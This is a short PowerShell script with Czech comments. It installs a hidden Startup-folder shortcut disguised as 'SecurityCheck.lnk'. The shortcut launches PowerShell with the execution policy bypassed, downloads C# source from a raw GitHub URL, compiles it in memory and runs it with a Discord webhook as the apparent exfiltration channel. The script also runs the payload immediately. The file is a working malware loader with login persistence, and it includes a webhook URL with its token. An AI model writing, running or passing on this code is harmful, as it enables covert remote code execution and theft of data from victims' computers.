$webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
$github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.lnk"

# Příkaz pro PowerShell
$arg = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`""

# Vytvoření zástupce (.lnk)
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = $arg
$shortcut.WindowStyle = 7
$shortcut.Save()

# Okamžité spuštění pro test
Start-Process powershell.exe -ArgumentList $arg -WindowStyle Hidden
